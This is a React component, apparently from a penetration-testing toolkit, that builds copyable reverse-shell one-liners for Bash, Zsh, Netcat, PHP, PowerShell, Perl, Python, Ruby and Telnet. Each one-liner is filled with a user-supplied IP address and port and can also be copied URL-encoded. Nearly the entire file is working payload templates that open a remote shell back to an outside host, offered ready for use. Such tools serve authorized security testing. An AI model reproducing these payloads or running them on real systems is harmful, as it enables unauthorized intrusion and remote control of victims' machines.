import React from 'react';
import { Button, message, Typography, Row, Col, Divider, Input } from 'antd';
import { CopyOutlined, WifiOutlined, LinkOutlined, createFromIconfontCN } from '@ant-design/icons';
import PersistedState from 'use-persisted-state';
import QueueAnim from 'rc-queue-anim';
import { Ipv4TcpCacheState } from 'components/types/Ipv4TcpCacheState';
import Clipboard from 'react-clipboard.js';

const { Title, Paragraph, Text } = Typography;
const IconFont = createFromIconfontCN( {
    scriptUrl: [ './iconfont.js' ]
} );

export default function ReverseShell () {
    const useIPv4State = PersistedState<Ipv4TcpCacheState>( 'ipv4_tcp_cache' );
    const [ values, setValues ] = useIPv4State( {
        ip: '',
        port: ''
    } );
    const handleChange = ( name: string ) => ( event: { target: { value: string } } ) => {
        setValues( { ...values, [ name ]: event.target.value } );
    };
    const successInfoReverseShell = () => {
        message.success( 'Your reverse shell has been copied successfully !' );
    };
    const successInfoEncodeURL = () => {
        message.success( 'Reverse shell URI encoded has been copied successfully !' );
    };
    const bash_rshell = `bash -c 'exec bash -i &>/dev/tcp/${ values.ip }/${ values.port } <&1'`;
    const netcat_rshell = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ values.ip } ${ values.port } >/tmp/f`;
    const php_rshell = `php -r '$sock=fsockopen(getenv("${ values.ip }"),getenv("${ values.port }"));exec("/bin/sh -i <&3 >&3 2>&3");'`;
    const PS_rshell = `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${ values.ip }',${ values.port });$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`;
    const perl_rshell = `perl -e 'use Socket;$i="$ENV{${ values.ip }}";$p=$ENV{${ values.port }};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
    const python_rshell = `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ values.ip }",${ values.port }));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`;
    const ruby_rshell = `ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["${ values.ip }"],ENV["${ values.port }"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`;
    const telnet_rshell = `TF=$(mktemp -u); mkfifo $TF && telnet ${ values.ip } ${ values.port } 0<$TF | /bin sh 1>$TF`;
    const zsh_rshell = `zsh -c 'zmodload zsh/net/tcp && ztcp ${ values.ip } ${ values.port } && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'`;

    return (
        <QueueAnim delay={300} duration={1500}>
            <Title level={2} style={{ fontWeight: 'bold', margin: 15 }}>
                Reverse shell
            </Title>
            <Paragraph style={{ margin: 15 }}>
                A reverse shell is a shell session established on a connection that is initiated from a remote machine,
                not from the local host.
            </Paragraph>
            <div style={{ padding: 15 }}>
                <Row gutter={{ xs: 8, sm: 16, md: 24, lg: 32 }}>
                    <Col span={12}>
                        <Input
                            maxLength={15}
                            prefix={<WifiOutlined />}
                            name='Ip adress'
                            placeholder='IP Address or domain (ex: 212.212.111.222)'
                            onChange={handleChange( 'ip' )}
                            value={values.ip}
                        />
                    </Col>
                    <Col span={12}>
                        <Input
                            maxLength={5}
                            prefix={<IconFont type='icon-Network-Plug' />}
                            name='Port'
                            placeholder='Port (ex: 1337)'
                            onChange={handleChange( 'port' )}
                            value={values.port}
                        />
                    </Col>
                </Row>
            </div>
            <Divider orientation='center'>Bash</Divider>
            <div style={{ padding: 10, marginTop: 15 }} key='a'>
                <Paragraph>
                    <pre>
                        <Text copyable>{bash_rshell}</Text>
                    </pre>
                </Paragraph>
                <Clipboard component='a' data-clipboard-text={bash_rshell}>
                    <Button
                        type='primary'
                        onClick={successInfoReverseShell}
                        style={{ marginBottom: 10, marginTop: 15 }}
                    >
                        <CopyOutlined /> Copy the reverse shell
                    </Button>
                </Clipboard>
                <Clipboard component='a' data-clipboard-text={encodeURI( bash_rshell )}>
                    <Button
                        type='dashed'
                        onClick={successInfoEncodeURL}
                        style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
                    >
                        <LinkOutlined /> URL encoded
                    </Button>
                </Clipboard>
            </div>
            <Divider orientation='center'>Zsh</Divider>
            <div style={{ padding: 10, marginTop: 15 }} key='b'>
                <Paragraph>
                    <pre>
                        <Text copyable>{zsh_rshell}</Text>
                    </pre>
                </Paragraph>
                <Clipboard component='a' data-clipboard-text={zsh_rshell}>
                    <Button
                        type='primary'
                        onClick={successInfoReverseShell}
                        style={{ marginBottom: 10, marginTop: 15 }}
                    >
                        <CopyOutlined /> Copy the reverse shell
                    </Button>
                </Clipboard>
                <Clipboard component='a' data-clipboard-text={encodeURI( zsh_rshell )}>
                    <Button
                        type='dashed'
                        onClick={successInfoEncodeURL}
                        style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
                    >
                        <LinkOutlined /> URL encoded
                    </Button>
                </Clipboard>
            </div>
            <Divider orientation='center'>Netcat</Divider>
            <div style={{ padding: 10, marginTop: 15 }} key='c'>
                <Paragraph>
                    <pre>
                        <Text copyable>{netcat_rshell}</Text>
                    </pre>
                </Paragraph>
                <Clipboard component='a' data-clipboard-text={netcat_rshell}>
                    <Button
                        type='primary'
                        onClick={successInfoReverseShell}
                        style={{ marginBottom: 10, marginTop: 15 }}
                    >
                        <CopyOutlined /> Copy the reverse shell
                    </Button>
                </Clipboard>
                <Clipboard component='a' data-clipboard-text={encodeURI( netcat_rshell )}>
                    <Button
                        type='dashed'
                        onClick={successInfoEncodeURL}
                        style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
                    >
                        <LinkOutlined /> URL encoded
                    </Button>
                </Clipboard>
            </div>
            <Divider orientation='center'>PHP</Divider>
            <div
                key='d'
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Paragraph>
                    <pre>
                        <Text copyable>{php_rshell}</Text>
                    </pre>
                </Paragraph>
                <Clipboard component='a' data-clipboard-text={php_rshell}>
                    <Button
                        type='primary'
                        onClick={successInfoReverseShell}
                        style={{ marginBottom: 10, marginTop: 15 }}
                    >
                        <CopyOutlined />
                        Copy the reverse shell
                    </Button>
                </Clipboard>
                <Clipboard component='a' data-clipboard-text={encodeURI( php_rshell )}>
                    <Button
                        type='dashed'
                        onClick={successInfoEncodeURL}
                        style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
                    >
                        <LinkOutlined /> URL encoded
                    </Button>
                </Clipboard>
            </div>

            <Divider orientation='center'>PowerShell</Divider>
            <div style={{ padding: 10, marginTop: 15 }} key='e'>
                <Paragraph>
                    <pre>
                        <Text copyable>{PS_rshell}</Text>
                    </pre>
                </Paragraph>
                <Clipboard component='a' data-clipboard-text={PS_rshell}>
                    <Button
                        type='primary'
                        onClick={successInfoReverseShell}
                        style={{ marginBottom: 10, marginTop: 15 }}
                    >
                        <CopyOutlined /> Copy the reverse shell
                    </Button>
                </Clipboard>
                <Clipboard component='a' data-clipboard-text={encodeURI( PS_rshell )}>
                    <Button
                        type='dashed'
                        onClick={successInfoEncodeURL}
                        style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
                    >
                        <LinkOutlined /> URL encoded
                    </Button>
                </Clipboard>
            </div>
            <div
                key='f'
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Divider orientation='center'>Perl</Divider>
                <Paragraph>
                    <pre>
                        <Text copyable>{perl_rshell}</Text>
                    </pre>
                </Paragraph>
                <Clipboard component='a' data-clipboard-text={perl_rshell}>
                    <Button
                        type='primary'
                        onClick={successInfoReverseShell}
                        style={{ marginBottom: 10, marginTop: 15 }}
                    >
                        <CopyOutlined />
                        Copy the reverse shell
                    </Button>
                </Clipboard>
                <Clipboard component='a' data-clipboard-text={encodeURI( perl_rshell )}>
                    <Button
                        type='dashed'
                        onClick={successInfoEncodeURL}
                        style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
                    >
                        <LinkOutlined /> URL encoded
                    </Button>
                </Clipboard>
            </div>
            <Divider orientation='center'>Python</Divider>
            <div
                key='g'
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Paragraph>
                    <pre>
                        <Text copyable>{python_rshell}</Text>
                    </pre>
                </Paragraph>
                <Clipboard component='a' data-clipboard-text={python_rshell}>
                    <Button
                        type='primary'
                        onClick={successInfoReverseShell}
                        style={{ marginBottom: 10, marginTop: 15 }}
                    >
                        <CopyOutlined />
                        Copy the reverse shell
                    </Button>
                </Clipboard>
                <Clipboard component='a' data-clipboard-text={encodeURI( python_rshell )}>
                    <Button
                        type='dashed'
                        onClick={successInfoEncodeURL}
                        style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
                    >
                        <LinkOutlined /> URL encoded
                    </Button>
                </Clipboard>
            </div>
            <Divider orientation='center'>Ruby</Divider>
            <div
                key='h'
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Paragraph>
                    <pre>
                        <Text copyable>{ruby_rshell}</Text>
                    </pre>
                </Paragraph>
                <Clipboard component='a' data-clipboard-text={ruby_rshell}>
                    <Button
                        type='primary'
                        onClick={successInfoReverseShell}
                        style={{ marginBottom: 10, marginTop: 15 }}
                    >
                        <CopyOutlined />
                        Copy the reverse shell
                    </Button>
                </Clipboard>
                <Clipboard component='a' data-clipboard-text={encodeURI( ruby_rshell )}>
                    <Button
                        type='dashed'
                        onClick={successInfoEncodeURL}
                        style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
                    >
                        <LinkOutlined /> URL encoded
                    </Button>
                </Clipboard>
            </div>
            <Divider orientation='center'>Telnet</Divider>
            <div style={{ padding: 15, marginTop: 15 }} key='i'>
                <Paragraph>
                    <pre>
                        <Text copyable>{telnet_rshell}</Text>
                    </pre>
                </Paragraph>
                <Clipboard component='a' data-clipboard-text={telnet_rshell}>
                    <Button
                        type='primary'
                        onClick={successInfoReverseShell}
                        style={{ marginBottom: 10, marginTop: 15 }}
                    >
                        <CopyOutlined />
                        Copy the reverse shell
                    </Button>
                </Clipboard>
                <Clipboard component='a' data-clipboard-text={encodeURI( telnet_rshell )}>
                    <Button
                        type='dashed'
                        onClick={successInfoEncodeURL}
                        style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
                    >
                        <LinkOutlined /> URL encoded
                    </Button>
                </Clipboard>
            </div>
        </QueueAnim>
    );
}
